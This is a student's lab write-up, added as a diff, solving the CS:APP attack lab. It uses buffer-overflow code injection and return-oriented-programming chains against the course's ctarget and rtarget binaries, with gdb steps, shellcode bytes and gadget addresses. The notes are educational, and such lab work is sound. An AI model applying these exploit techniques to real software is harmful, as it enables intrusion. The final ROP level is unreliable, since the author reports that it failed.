@@ -1,0 +1,115 @@
+Part I: Code Injection Attacks
+if you cause a segment fault, the sighandler will detect it and inform you.
+in this case, you don't need to know the details of how <save_char> and <save_term> works;
+4.1
+Level 1:
+gdb ctarget
+b test
+layout regs
+run -q
+  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+0000000000401a40 <Gets>:
+  401a51:	48 89 fb             	mov    %rdi,%rbx
+  ...
+  401a56:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
+  401a5a:	88 03                	mov    %al,(%rbx)
+  ...
+  401a64:	48 89 eb             	mov    %rbp,%rbx
+by analysing the above code,we know BUFFER_SIZE==(0x28),so we just need to
+fill 0x28 bytes,and the next 8bytes will overwrite the ret of <getbuf>,
+find the address of touch1(),it's 4017c0 ->0x004017c0->c0 17 40 00
+  401a6e:	e8 4d f3 ff ff       	callq  400dc0 <_IO_getc@plt>
+  401a73:	83 f8 ff             	cmp    $0xffffffff,%eax
+  401a76:	74 05                	je     401a7d <Gets+0x3d>
+  401a78:	83 f8 0a             	cmp    $0xa,%eax
+  401a7b:	75 d9                	jne    401a56 <Gets+0x16>
+<_IO_getc@plt> will only check EOF and '\n',so it's ok to input NUL
+touch ctarget-l1.txt //fill it with 0x28 NUL(00) and return value
+touch ctarget-l1-raw.txt
+unix>./hex2raw < ctarget-l1.txt > ctarget-l1-raw.txt
+unix>./ctarget -q < ctarget-l1-raw.txt
+it worked!
+4.2
+Level 2:
+Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate.
+injection code:
+push $0x4017ec //touch2
+mov $0x59b997fa,%rdi
+ret
+above.s->xxx.o->xxx.d:
+
+Disassembly of section .text:
+0000000000000000 <.text>:
+   0:	68 ec 17 40 00       	pushq  $0x4017ec  //c1
+   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi //c2
+   c:	c3                   	retq //c3
+use gdb to find rsp in <Gets>:
+print /x $rsp
+$1 = 0x5561dc58 (notice that all the program is running in a vitual space,so the addrss of rsp does not change everytime you run it)
+we need to overwiite the ret of getbuf with our injection code,
+our injection code could only be stored in stack,when we returnd from <Gets>,
+stack looks like this:
+c3
+c2
+c1 ->the address you want rip to take
+next_instrucion 
+bottom of 0x28 bytes <-rsp
+in <Gtes>, we will overwrite next_instruction with rsp+0x20+0x28+0x8
+which is 0x5561dca8,use hex2raw convert ctarget-l2.txt,
+test it ,and it works.
+4.3
+Level 3:
+in <Gets>, you need to rewrite the ret of <getbuf> with rsp+0x20+0x28+0x8+0x8+0x8
+then write your 8-bytes string,the instructions later are:
+
+mov %rsp,%rdi
+push $0x4018fa
+ret
+other steps are similar,test it and it works.
+Part II: Return-Oriented Programming
+5.1
+Level 2:
+the stack in <getbuf> should look like this:
+
+entry of touch2() //0x4017ec
+adress of gadget 2
+cookie //0x59b997fa
+address of gadget 1
+0x28 bytes
+
+I divided the steps because farm doesn't have a one-way sequence.
+gadget1: ->58 90 c3 @0x4019cc
+popq %rax
+nop
+ret
+gadget2: ->48 89 c7 c3 @ 0x4019a2
+mov %rax,%rdi
+ret
+test it with rtarget-l2-raw.txt,it works.
+5.2
+Level 3:
+stack looks like this:
+
+'\0'
+cookie
+entry of touth2()
+address of gadgetn
+...
+address of gadget1
+0x28bytes
+
+mov %rsp,%rax @0x401a06
+mov %rax,%rdi @0x4019a2
+pop %rax //should pop 9*0x8 @0x4019cc
+movl %eax,%edx @0x4019de
+movl %edx,%ecx @0x401a69
+movl %ecx,%esi @0x401a13
+lea (%rdi,%rsi,1),%rax @0x4019d6
+mov %rax,%rdi @0x4019a2
+
+I have tested it and it failed, the steps are right so I guess some minor fault cause it.
+
